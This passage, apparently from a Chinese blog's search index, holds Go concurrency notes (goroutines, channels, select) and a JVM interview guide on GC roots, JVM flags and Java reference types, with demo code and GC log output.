r)) } }() a := 1 b := 0 fmt.Println(a / b) // runtime error: integer divide by zero // panic(errors.New(&quot;this is an error&quot;)) // panic(123) // 如果不是一个错误的话就, 再次 panic 出去}func main() { tryRecover() } 并发编程goroutine1、协程 轻量级“线程” 非抢占式多任务处理，由协程主动交出控制权 编译器/解释器/虚拟器层面的多任务 多个协程可能在一个或者多个线程上运行 package mainimport ( &quot;fmt&quot; &quot;time&quot;)func test() { // 此时, 不会输出, main 先退出了, 必须让 main sleep for i := 0; i &lt; 1000; i++ { // 匿名函数 go func(i int) { for { fmt.Printf(&quot;From %d\\n&quot;, i) } }(i) } time.Sleep(time.Millisecond)}func test2() { // 此时不会退出, 因为不能交出控制权 var arr [10]int for i := 0; i &lt; 10; i++ { // 匿名函数 go func(i int) { arr[i]++ }(i) } time.Sleep(time.Millisecond)}func main() { test() test2()} 2、go 语言中的调度器 协程可以相互通信 channelchannel是goroutine之间互相通讯的东西。类似我们 Unix 上的管道（可以在进程间传递消息），用来goroutine之间发消息和接收消息。其实，就是在做goroutine之间的内存共享。channel是类型相关的，也就是说一个channel只能传递一种类型的值，这个类型需要在channel声明时指定。 package mainimport ( &quot;fmt&quot; &quot;time&quot;)// 定义chanfunc defineChan() { // 声名一个传递int型的channel // var a chan int // 初始化一个int型channel a := make(chan int) // 从channel中获取 go func() { for { z := &lt;-a fmt.Println(z) } }() a &lt;- 1 time.Sleep(time.Millisecond)}// 定义带缓存chanfunc bufChan() { // 初始化一个int型channel a := make(chan int, 3) // 从channel中获取 go func() { for { //z, ok := &lt;-a //if !ok { // break //} //fmt.Println(z) // 或者使用这种, 确保发送完成 for z := range a { fmt.Println(z) } } }() a &lt;- 1 a &lt;- 2 a &lt;- 3 a &lt;- 4 close(a) // 关闭了的话, 就一直发送0 time.Sleep(time.Millisecond)}// 如何使用func chanDemo() { // 定义一个只能收数据的channel, 把数据放到channel中 var channels [10]chan&lt;- int for i := 0; i &lt; len(channels); i++ { channels[i] = createWorker(i) } // 向channel中写数据 for i := 0; i &lt; len(channels); i++ { channels[i] &lt;- 'a' + i } time.Sleep(time.Millisecond)}func createWorker(i int) chan&lt;- int { c := make(chan int) go func() { for { fmt.Printf(&quot;Worker %d received %c\\n&quot;, i, &lt;-c) } }() return c}func main() { defineChan() bufChan() chanDemo()} 使用 Channel 等待任务结束package mainimport ( &quot;fmt&quot;)type worker struct { in chan int done chan bool // 使用done来通信确定完成}func chanDemo() { var channels [10]worker for i := 0; i &lt; len(channels); i++ { channels[i] = createWorker(i) } // 向channel中写数据 for i := 0; i &lt; len(channels); i++ { channels[i].in &lt;- 'a' + i &lt;-channels[i].done // 等待channel完成 }}func createWorker(i int) worker { w := worker{ in: make(chan int), done: make(chan bool), } go func() { for in := range w.in { fmt.Printf(&quot;Worker %d received %c\\n&quot;, i, in) w.done &lt;- true } }() return w}func main() { chanDemo()} 使用 select 进行调度package mainimport ( &quot;fmt&quot; &quot;math/rand&quot; &quot;time&quot;)func selectDemo() { var c1, c2 chan int c1, c2 = createChan(), createChan() for { select { case n := &lt;-c1: fmt.Printf(&quot;from c1, val: %d\\n&quot;, n) case n := &lt;-c2: fmt.Printf(&quot;from c2, val: %d\\n&quot;, n) } }}func createChan() chan int { out := make(chan int) go func() { i := 0 for { time.Sleep(time.Duration(rand.Intn(1000)) * time.Millisecond) i++ out &lt;- i } }() return out}func main() { selectDemo()}","link":"/2019/10/11/Go%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/"},{"title":"JVM 面试","text":"JVM 垃圾回收的时候如何确定垃圾？知道什么是 GC Roots ? 什么是垃圾 简单来说就是内存中已经不在被使用到的空间就是垃圾 要进行垃圾回收，如何判断一个对象是否可以被回收？ 引用计数法 枚举根节点做可达性分析 为了解决引用计数法的循环引用问题，Java 使用了可达性算法。 跟踪收集器采用的为集中式的管理方式，全局记录对象之间的引用状态，执行时从一些列GC Roots的对象做为起点，从这些节点向下开始进行搜索所有的引用链，当一个对象到GC Roots 没有任何引用链时，则证明此对象是不可用的。 图中，对象Object6、Object7、Object8虽然互相引用，但他们的GC Roots是不可到达的，所以它们将会被判定为是可回收的对象。 哪些对象可以作为 GC Roots 的对象： 虚拟机栈（栈帧中的局部变量区，也叫局部变量表）中引用的对象 方法区中的类静态属性引用的对象 方法去常量引用的对象 本地方法栈中 JNI (Native方法)引用的对象 你说你做过 JVM 调优和参数配置，请问如果盘点查看 JVM 系统默认值？JVM 的参数类型: 标配参数 -version -help X 参数（了解） -Xint：解释执行 -Xcomp：第一次使用就编译成本地代码 -Xmixed：混合模式 XX 参数 Boolean 类型：-XX：+ 或者 - 某个属性值（+ 表示开启，- 表示关闭） -XX:+PrintGCDetails：打印 GC 收集细节 -XX:-PrintGCDetails：不打印 GC 收集细节 -XX:+UseSerialGC：使用了串行收集器 -XX:-UseSerialGC：不使用了串行收集器 KV 设置类型：-XX:key=value -XX:MetaspaceSize=128m -XX:MaxTenuringThreshold=15 jinfo 举例，如何查看当前运行程序的配置 public class HelloGC { public static void main(String[] args) { System.out.println(&quot;hello GC...&quot;); try { Thread.sleep(Integer.MAX_VALUE); } catch (InterruptedException e) { e.printStackTrace(); } }} 我们可以使用 jps -l 命令，查出进程 id 1923 org.jetbrains.jps.cmdline.Launcher1988 sun.tools.jps.Jps1173 org.jetbrains.kotlin.daemon.KotlinCompileDaemon32077 com.intellij.idea.Main1933 com.cuzz.jvm.HelloGC32382 org.jetbrains.idea.maven.server.RemoteMavenServer 在使用 jinfo -flag PrintGCDetails 1933 命令查看 -XX:-PrintGCDetails 可以看出默认是不打印 GC 收集细节也可是使用jinfo -flags 1933 查看所以的参数 两个经典参数：-Xms 和 - Xmx（如 -Xms1024m） -Xms 等价于 -XX:InitialHeapSize -Xmx 等价于 -XX:MaxHeapSize 盘点家底查看 JVM 默认值 查看初始默认值：-XX:+PrintFlagsInitialcuzz@cuzz-pc:~/Project/demo$ java -XX:+PrintFlagsInitial[Global flags] intx ActiveProcessorCount = -1 {product} uintx AdaptiveSizeDecrementScaleFactor = 4 {product} uintx AdaptiveSizeMajorGCDecayTimeScale = 10 {product} uintx AdaptiveSizePausePolicy = 0 {product} uintx AdaptiveSizePolicyCollectionCostMargin = 50 {product} uintx AdaptiveSizePolicyInitializingSteps = 20 {product} uintx AdaptiveSizePolicyOutputInterval = 0 {product} uintx AdaptiveSizePolicyWeight = 10 {product} ... 查看修改更新：-XX:+PrintFlagsFinalbool UsePSAdaptiveSurvivorSizePolicy = true {product}bool UseParNewGC = false {product}bool UseParallelGC := true {product}bool UseParallelOldGC = true {product}bool UsePerfData = true {product}bool UsePopCountInstruction = true {product}bool UseRDPCForConstantTableBase = false {C2 product} = 与 := 的区别是，一个是默认，一个是人物改变或者 jvm 加载时改变的参数 打印命令行参数(可以看默认垃圾回收器)：-XX:+PrintCommandLineFlagscuzz@cuzz-pc:~/Project/demo$ java -XX:+PrintCommandLineFlags-XX:InitialHeapSize=128789376 -XX:MaxHeapSize=2060630016 -XX:+PrintCommandLineFlags -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC 你平时工作用过的 JVM 常用的基本配置参数有哪些？ -Xms 初始大小内存，默认为物理内存 1/64 等价于 -XX:InitialHeapSize -Xmx 最大分配内存，默认为物理内存的 1/4 等价于 -XX:MaxHeapSize -Xss 设置单个线程栈的大小，一般默认为 512-1024k 等价于 -XX:ThreadStackSize -Xmn 设置年轻代的大小 整个JVM内存大小=年轻代大小 + 年老代大小 + 持久代大小，持久代一般固定大小为64m，所以增大年轻代后，将会减小年老代大小。此值对系统性能影响较大，Sun官方推荐配置为整个堆的3/8。 -XX:MetaspaceSize 设置元空间大小（元空间的本质和永久代类似，都是对 JVM 规范中的方法区的实现，不过元空间于永久代之间最大区别在于，元空间并不在虚拟中，而是使用本地内存，因此默认情况下，元空间的大小仅受本地内存限制） 元空间默认比较小，我们可以调大一点 -XX:+PrintGCDetails 输出详细 GC 收集日志信息 设置 JVM 参数为： -Xms10m -Xmx10m -XX:+PrintGCDetails -XX:SurvivorRatio 设置新生代中 eden 和 S0/S1 空间比例 默认 -XX:SurvivorRatio=8，Eden : S0 : S1 = 8 : 1 : 1 -XX:NewRatio 配置年轻代和老年代在堆结构的占比 默认 -XX:NewRatio=2 新生代占1，老年代占2，年轻代占整个堆的 1/3 -XX:MaxTenuringThreshold 设置垃圾最大年龄 强引用、软引用、弱引用和虚引用分别是什么？在Java语言中，除了基本数据类型外，其他的都是指向各类对象的对象引用；Java中根据其生命周期的长短，将引用分为4类。 强引用 我们平常典型编码Object obj = new Object()中的 obj 就是强引用，通过关键字new创建的对象所关联的引用就是强引用。 当JVM内存空间不足，JVM宁愿抛出 OutOfMemoryError 运行时错误（OOM），使程序异常终止，也不会靠随意回收具有强引用的“存活”对象来解决内存不足的问题。 对于一个普通的对象，如果没有其他的引用关系，只要超过了引用的作用域或者显式地将相应强引用赋值为 null，就是可以被垃圾收集的了，具体回收时机还是要看垃圾收集策略。 软引用 软引用通过SoftReference类实现， 软引用的生命周期比强引用短一些。 只有当 JVM 认为内存不足时，才会去试图回收软引用指向的对象：即 JVM 会确保在抛出 OutOfMemoryError 之前，清理软引用指向的对象。 软引用可以和一个引用队列（ReferenceQueue）联合使用，如果软引用所引用的对象被垃圾回收器回收，Java虚拟机就会把这个软引用加入到与之关联的引用队列中。后续，我们可以调用ReferenceQueue的poll()方法来检查是否有它所关心的对象被回收。如果队列为空，将返回一个null，否则该方法返回队列中前面的一个Reference对象。 应用场景：软引用通常用来实现内存敏感的缓存。如果还有空闲内存，就可以暂时保留缓存，当内存不足时清理掉，这样就保证了使用缓存的同时，不会耗尽内存。 代码验证，我设置 JVM 参数为 -Xms10m -Xmx10m -XX:+PrintGCDetails public class SoftReferenceDemo { public static void main(String[] args) { Object obj = new Object(); SoftReference&lt;Object&gt; softReference = new SoftReference&lt;&gt;(obj); obj = null; try { // 分配 20 M byte[] bytes = new byte[20 * 1024 * 1024]; } catch (Exception e) { e.printStackTrace(); } finally { System.out.println(&quot;软引用：&quot; + softReference.get()); } }} 发现当内存不够的时候就会被回收。 [GC (Allocation Failure) [PSYoungGen: 1234K-&gt;448K(2560K)] 1234K-&gt;456K(9728K), 0.0016748 secs] [Times: user=0.00 sys=0.00, real=0.01 secs] [GC (Allocation Failure) [PSYoungGen: 448K-&gt;384K(2560K)] 456K-&gt;392K(9728K), 0.0018398 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] [Full GC (Allocation Failure) [PSYoungGen: 384K-&gt;0K(2560K)] [ParOldGen: 8K-&gt;358K(7168K)] 392K-&gt;358K(9728K), [Metaspace: 3030K-&gt;3030K(1056768K)], 0.0057246 secs] [Times: user=0.01 sys=0.00, real=0.01 secs] [GC (Allocation Failure) [PSYoungGen: 0K-&gt;0K(2560K)] 358K-&gt;358K(9728K), 0.0006038 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] [Full GC (Allocation Failure) [PSYoungGen: 0K-&gt;0K(2560K)] [ParOldGen: 358K-&gt;340K(7168K)] 358K-&gt;340K(9728K), [Metaspace: 3030K-&gt;3030K(1056768K)], 0.0115080 secs] [Times: user=0.01 sys=0.00, real=0.01 secs] 软引用：nullException in thread &quot;main&quot; java.lang.OutOfMemoryError: Java heap space at com.cuzz.jvm.SoftReferenceDemo.main(SoftReferenceDemo.java:21)Heap PSYoungGen total 2560K, used 98K [0x00000000ffd00000, 0x0000000100000000, 0x0000000100000000) eden space 2048K, 4% used [0x00000000ffd00000,0x00000000ffd18978,0x00000000fff00000) from space 512K, 0% used [0x00000000fff00000,0x00000000fff00000,0x00000000fff80000) to space 512K, 0% used [0x00000000fff80000,0x00000000fff80000,0x0000000100000000) ParOldGen total 7168K, used 340K [0x00000000ff600000, 0x00000000ffd00000, 0x00000000ffd00000) object space 7168K, 4% used [0x00000000ff600000,0x00000000ff6552f8,0x00000000ffd00000) Metaspace used 3067K, capacity 4496K, committed 4864K, reserved 1056768K class space used 336K, capacity 388K, committed 512K, reserved 1048576K 弱引用 弱引用通过 WeakReference 类实现， 弱引用的生命周期比软引用短。 在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。由于垃圾回收器是一个优先级很低的线程，因此不一定会很快回收弱引用的对象。 弱引用可以和一个引用队列（ReferenceQueue）联合使用，如果弱引用所引用的对象被垃圾回收，Java虚拟机就会把这个弱引用加入到与之关联的引用队列中。 应用场景：弱应用同样可用于内存敏感的缓存。 代码验证 public class WeakReferenceDemo { public static void main(String[] args) { Object obj = new Object(); WeakReference&lt;Object&gt; weakReference = new WeakReference&lt;&gt;(obj); System.out.println(obj); System.out.println(weakReference.get()); obj = null; System.gc(); System.out.println(&quot;GC之后....&quot;); System.out.println(obj); System.out.println(weakReference.get()); }} 输出 java.lang.Object@1540e19djava.lang.Object@1540e19dGC之后....nullnull 引用队列 public class ReferenceQueueDemo { public static void main(String[] args) throws InterruptedException { Object obj = new Object(); ReferenceQueue&lt;Object&gt; referenceQueue = new ReferenceQueue&lt;&gt;(); WeakReference&lt;Object&gt; weakReference = new WeakReference&lt;&gt;(obj, referenceQueue); System.out.println(obj); System.out.println(weakReference.get()); System.out.println(weakReference); obj = null; System.gc(); Thread.sleep(500); System.out.println(&quot;GC之后....&quot;); System.out.println(obj); System.out.println(weakReference.get()); System.out.println(weakReference); }} 会把该对象的包装类即weakReference放入到ReferenceQueue里面，我们可以从queue中获取到相应的对象信息，同时进行额外的处理。比如反向操作，数据清理等。 java.lang.Object@1540e19djava.lang.Object@1540e19djava.lang.ref.WeakReference@677327b6GC之后....nullnulljava.lang.ref.WeakReference@677327b6 虚引用 虚引用也叫幻象引用，通过PhantomReference类来实现，无法通过虚引用访问对象的任何属性或函数。 幻象引用仅仅是提供了一种确保对象被 finalize 以后，做某些事情的机制。 如果一个对象仅持有虚引